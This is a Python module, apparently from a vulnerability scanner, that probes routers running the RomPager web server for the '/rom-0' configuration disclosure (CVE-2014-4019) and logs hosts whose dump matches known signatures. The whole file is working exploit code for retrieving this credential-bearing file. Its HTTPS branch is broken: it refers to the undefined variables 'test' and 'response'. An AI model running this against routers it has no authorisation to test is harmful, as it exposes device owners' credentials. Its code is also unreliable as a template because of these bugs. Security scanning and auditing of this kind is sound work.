import httplib2
import re
import logging

'''
title = '/rom-0 information disclosure present in ZTE, TP-Link, ZynOS, Huawei',
Information disclosure present in RomPager Embedded Web Server.
Affected devices include ZTE, TP-Link, ZynOS, Huawei and many others.
ZTE, TP-Link, ZynOS, Huawei and possibly others are vulnerable to remote credential and information disclosure.
Attackers can query the URIs "/rom-0" to extract sensitive information.
references = {
      'https://dariusfreamon.wordpress.com/tag/rompager/',
      'http://rootatnasro.wordpress.com/2014/01/11/how-i-saved-your-a-from-the-zynos-rom-0-attack-full-disclosure/',
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-4019',
      'http://www.osvdb.org/show/osvdb/102668'
    },
'''


# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green
O = '\033[33m' # orange


class Rom_0(object):

    def __init__(self, target_list):
        self.target_list = target_list
        self.findings = []


    def run(self):
        """
        wrapper for the exploits
        :return: list
        """

        for target in self.target_list:
            if self.check_host(target=str(target.split(':')[0]), port=str(target.split(':')[1])):
                self.exploit(target=str(target.split(':')[0]), port=str(target.split(':')[1]))
        return self.findings

    def check_host(self, target, port):
        """
        Send testing request to server to check if it responds with a 200 to any requests
        :param target: string
        :param port: string
        :return: boolean
        """
        url = target+':'+port
        test_strings = ['/sjf_hdid','/s_a?jghjf/','/']
        response = 0
        errors = 0
        for test in test_strings:
            try:
                conn = httplib2.Http(disable_ssl_certificate_validation=True)
                if port == '443':
                    try:
                        resp, content = conn.request('https://' + url + test, 'GET')
                        if resp['status'] == '200':
                            response += 1
                    except:
                        pass
                else:
                    resp, content = conn.request('http://' + url + test, 'GET')

                if resp['status'] == '200':
                    response += 1

            except ConnectionError as e:
                errors += 1
                logging.debug('Error: '+str(e))

        if errors == 3:
            logging.debug(R+'Error limit reached for host %s:%s' %(target,port)+W)
            return False

        elif response == 3:
            logging.warning(R+'Ambiguous response from web server on %s:%s. All URIs return status 200' %(target, port)+W)
            return False

        return True


    def exploit(self, target, port):
        """
        Exploit rom-0
        :param target: string
        :param port: string
        :return:
        """
        logging.info('Testing: %s:%s' % (target, port))
        url = target+':'+str(port)
        try:
            conn = httplib2.Http(disable_ssl_certificate_validation=True)
            if port == '443':
                try:
                    resp, content = conn.request('https://' + url + test, 'GET')
                    if resp['status'] == '200':
                        response += 1
                except:
                    pass
            else:
                resp, content = conn.request('http://' + url + '/rom-0', 'GET')
            if resp['status'] == '200':
                page = content.decode('utf-8')
                re1 = re.compile('spt\.dat')
                re2 = re.compile('autoexec\.net')
                re3 = re.compile('dbgarea')
                if re1.findall(page) or re2.findall(page) or re3.findall(page):
                    logging.info(G+'Target \"%s\" is vulnerable!'%url +W)
                    finding = target + ';' + port + ';' + 'HTTP' + ';' + 'Information Disclosure' + ';'+'Rom0'+';'+ 'URL: http://' + url+'/rom-0'
                    self.findings.append(finding)
                else:
                    logging.warning(O + 'Correct HTTP (200) answer but uncorrect signature. Check manually!'+W)

        except ConnectionError as e:
            logging.warning(R + str(e)+W)
            pass